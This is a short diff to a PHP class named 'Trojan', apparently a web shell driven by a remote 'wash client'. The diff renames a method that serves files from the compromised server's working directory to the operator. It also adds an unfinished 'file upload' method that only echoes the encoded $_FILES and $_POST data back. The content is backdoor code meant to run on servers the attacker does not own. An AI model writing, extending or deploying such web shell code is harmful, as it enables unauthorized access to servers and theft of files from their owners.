@@ -149,7 +149,7 @@ class Trojan{
      *
      * @param string $args             Arguments passed from the wash client
      */
-    public function payload_download($args){
+    public function payload_file_down($args){
         $file = $args['file'];
         chdir($this->cwd);
         # if the requested file exists, serve it up to the user
@@ -168,6 +168,22 @@ class Trojan{
         # if not, provide a notification
         else { echo "The requested file does not exist."; }
         die();
+    }
+
+    /**
+     * Uploads files to the target server
+     */
+    public function payload_file_up($args){
+        $out = json_encode($_FILES);
+        $out = json_encode($_POST);
+
+        # assemble a response
+        $this->response = array(
+            'output'         => $out,
+            'prompt_context' => $this->prompt_context,
+        );
+
+        $this->send_response();
     }
 
     # fire mah layzor
